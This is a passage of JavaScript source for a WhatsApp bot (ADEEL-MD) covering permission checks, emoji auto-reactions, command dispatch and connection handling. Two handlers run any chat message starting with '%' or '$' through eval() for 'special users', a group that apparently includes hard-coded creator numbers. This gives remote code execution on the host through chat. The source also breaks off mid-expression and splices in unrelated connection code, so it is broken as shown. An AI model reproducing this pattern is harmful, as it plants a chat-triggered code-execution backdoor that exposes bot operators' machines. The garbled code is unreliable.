💬 *Chat:* ${isGroup ? 'Group' : 'Private'}

*🔐 PERMISSIONS:*
- Bot Owner: ${isOwner ? '✅ Yes' : '❌ No'}
- Bot Installer: ${isBotInstaller ? '✅ Yes' : '❌ No'}
- Bot Creator: ${isBotCreator ? '✅ Yes' : '❌ No'}
- Group Admin: ${isGroup ? (isAdmins ? '✅ Yes' : '❌ No') : 'N/A'}

*📞 Phone Numbers:*
- Owner Numbers: ${ownerNumber.join(', ')}
- Installer Numbers: ${botInstallers.join(', ')}
- Creator Numbers: ${botCreators.join(', ')}
        `;
        reply(userInfo);
        return;
      }

      // SHELL & EVAL COMMANDS (Only for special users)
      if (isSpecialUser && mek.text.startsWith('%')) {
        let code = budy.slice(2);
        if (!code) {
          reply(`Provide me with a query to run Master!`);
          return;
        }
        try {
          let resultTest = eval(code);
          if (typeof resultTest === 'object')
            reply(util.format(resultTest));
          else reply(util.format(resultTest));
        } catch (err) {
          reply(util.format(err));
        }
        return;
      }

      if (isSpecialUser && mek.text.startsWith('$')) {
        let code = budy.slice(2);
        if (!code) {
          reply(`Provide me with a query to run Master!`);
          return;
        }
        try {
          let resultTest = await eval(
            'const a = async()=>{\n' + code + '\n}\na()',
          );
          let h = util.format(resultTest);
          if (h === undefined) return console.log(h);
          else reply(h);
        } catch (err) {
          if (err === undefined)
            return console.log('error');
          else reply(util.format(err));
        }
        return;
      }

      // OWNER REACT (Special users ke liye)
      if (isSpecialUser && !isReact) {
        const reactions = ["👑", "💀", "📊", "⚙️", "🧠", "🎯", "📈", "📝", "🏆", "🌍", "🇵🇰", "💗", "❤️", "💥", "🌼", "🏵️", "💐", "🔥", "❄️", "🌝", "🌚", "🐥", "🧊"];
        const randomReaction = reactions[Math.floor(Math.random() * reactions.length)];
        m.react(randomReaction);
      }

      // AUTO REACT
      if (!isReact && config.AUTO_REACT === 'true') {
        const reactions = [
          '🌼', '❤️', '💐', '🔥', '🏵️', '❄️', '🧊', '🐳', '💥', '🥀', '❤‍🔥', '🥹', '😩', '🫣', 
          '🤭', '👻', '👾', '🫶', '😻', '🙌', '🫂', '🫀', '👩‍🦰', '🧑‍🦰', '👩‍⚕️', '🧑‍⚕️', '🧕', 
          '👩‍🏫', '👨‍💻', '👰‍♀', '🦹🏻‍♀️', '🧟‍♀️', '🧟', '🧞‍♀️', '🧞', '🙅‍♀️', '💁‍♂️', '💁‍♀️', '🙆‍♀️', 
          '🙋‍♀️', '🤷', '🤷‍♀️', '🤦', '🤦‍♀️', '💇‍♀️', '💇', '💃', '🚶‍♀️', '🚶', '🧶', '🧤', '👑', 
          '💍', '👝', '💼', '🎒', '🥽', '🐻', '🐼', '🐭', '🐣', '🪿', '🦆', '🦊', '🦋', '🦄', 
          '🪼', '🐋', '🐳', '🦈', '🐍', '🕊️', '🦦', '🦚', '🌱', '🍃', '🎍', '🌿', '☘️', '🍀', 
          '🍁', '🪺', '🍄', '🍄‍🟫', '🪸', '🪨', '🌺', '🪷', '🪻', '🥀', '🌹', '🌷', '💐', '🌾', 
          '🌸', '🌼', '🌻', '🌝', '🌚', '🌕', '🌎', '💫', '🔥', '☃️', '❄️', '🌨️', '🫧', '🍟', 
          '🍫', '🧃', '🧊', '🪀', '🤿', '🏆', '🥇', '🥈', '🥉', '🎗️', '🤹', '🤹‍♀️', '🎧', '🎤', 
          '🥁', '🧩', '🎯', '🚀', '🚁', '🗿', '🎙️', '⌛', '⏳', '💸', '💎', '⚙️', '⛓️', '🔪', 
          '🧸', '🎀', '🪄', '🎈', '🎁', '🎉', '🏮', '🪩', '📩', '💌', '📤', '📦', '📊', '📈', 
          '📑', '📉', '📂', '🔖', '🧷', '📌', '📝', '🔏', '🔐', '🩷', '❤️', '🧡', '💛', '💚', 
          '🩵', '💙', '💜', '🖤', '🩶', '🤍', '🤎', '❤‍🔥', '❤‍🩹', '💗', '💖', '💘', '💝', '❌', 
          '✅', '🔰', '〽️', '🌐', '🌀', '⤴️', '⤵️', '🔴', '🟢', '🟡', '🟠', '🔵', '🟣', '⚫', 
          '⚪', '🟤', '🔇', '🔊', '📢', '🔕', '♥️', '🕐', '🚩', '🇵🇰'
        ];
        const randomReaction = reactions[Math.floor(Math.random() * reactions.length)];
        m.react(randomReaction);
      }

      // CUSTOM REACT
      if (!isReact && config.CUSTOM_REACT === 'true') {
        const reactions = (config.CUSTOM_REACT_EMOJIS || '🥲,😂,👍🏻,🙂,😔').split(',');
        const randomReaction = reactions[Math.floor(Math.random() * reactions.length)];
        m.react(randomReaction);
      }

      // MODE CHECK - Ab special users ke liye alag se check
      if(!isSpecialUser && config.MODE === "private") return;
      if(!isSpecialUser && isGroup && config.MODE === "inbox") return;
      if(!isSpecialUser && !isGroup && config.MODE === "groups") return;

      // COMMAND HANDLER
      const events = require('./command');
      const cmdName = isCmd ? body.slice(1).trim().split(" ")[0].toLowerCase() : false;
      
      if (isCmd) {
        const cmd = events.commands.find((cmd) => cmd.pattern === (cmdName)) || events.commands.find((cmd) => cmd.alias && cmd.alias.includes(cmdName));
        if (cmd) {
          if (cmd.react) conn.sendMessage(from, { react: { text: cmd.react, key: mek.key }});
          
          try {
            cmd.function(conn, mek, m,{
              from, quoted, body, isCmd, command, args, q, text, isGroup, 
              sender, senderNumber, botNumber2, botNumber, pushname, 
              isMe, isOwner: isSpecialUser, // Changed to isSpecialUser
              isCreator: isCreator, 
              isBotInstaller, // Added
              isBotCreator, // Added
              isSpecialUser, // Added
              groupMetadata, groupName, participants, groupAdmins, 
              isBotAdmins, isAdmins, reply
            });
          } catch (e) {
            log("[PLUGIN ERROR] " + e, 'red', true);
          }
        }
      }

      events.commands.map(async(command) => {
        if (body && command.on === "body") {
          command.function(conn, mek, m,{
            from, l, quoted, body, isCmd, command, args, q, text, isGroup, 
            sender, senderNumber, botNumber2, botNumber, pushname, 
            isMe, isOwner: isSpecialUser, 
            isCreator, 
            isBotInstaller,
            isBotCreator,
            isSpecialUser,
            groupMetadata, groupName, participants, groupAdmins, 
            isBotAdmins, isAdmins, reply
          });
        } else if (mek.q && command.on === "text") {
          command.function(conn, mek, m,{
            from, l, quoted, body, isCmd, command, args, q, text, isGroup, 
            sender, senderNumber, botNumber2, botNumber, pushname, 
            isMe, isOwner: isSpecialUser, 
            isCreator, 
            isBotInstaller,
            isBotCreator,
            isSpecialUser,
            groupMetadata, groupName, participants, groupAdmins, 
            isBotAdmins, isAdmins, reply
          });
        } else if ((command.on === "image" || command.on === "photo") && mek.type === 
// ==================== CONNECTION LOGIC ====================
const sessionDir = path.join(__dirname, 'sessions');

async function connectToWA() {
  log('Connecting to WhatsApp...', 'cyan');
  
  const { state, saveCreds } = await useMultiFileAuthState(sessionDir);
  const { version } = await fetchLatestBaileysVersion();
  
  const conn = makeWASocket({
    logger: P({ level: 'silent' }),
    browser: Browsers.macOS("Firefox"),
    auth: {
      creds: state.creds,
      keys: makeCacheableSignalKeyStore(state.keys, P({ level: 'silent' }))
    },
    version
  });

  conn.ev.on('connection.update', async (update) => {
    const { connection, lastDisconnect } = update;
    
    if (connection === 'close') {
      const statusCode = new Boom(lastDisconnect?.error)?.output?.statusCode;
      log(`Connection closed: ${statusCode}`, 'yellow');

      if (statusCode === 440 || statusCode === 408 || statusCode === DisconnectReason.connectionLost) {
        log('Retrying in 5 seconds...', 'green');
        setTimeout(() => connectToWA(), 5000);
      } else if (statusCode === DisconnectReason.loggedOut) {
        log('Logged out! Scan again.', 'red');
      } else {
        setTimeout(() => connectToWA(), 5000);
      }
    } else if (connection === 'open') {
      log('Bot connected successfully! ✅', 'green');
    }
  });

  conn.ev.on('creds.update', saveCreds);
  return conn;
}

// EXPRESS SERVER
const express = require("express");
const app = express();
app.get("/", (req, res) => res.send("ADEEL-MD³⁰³ ACTIVE"));
app.listen(process.env.PORT || 9090);

// START
setTimeout(() => connectToWA(), 3000);
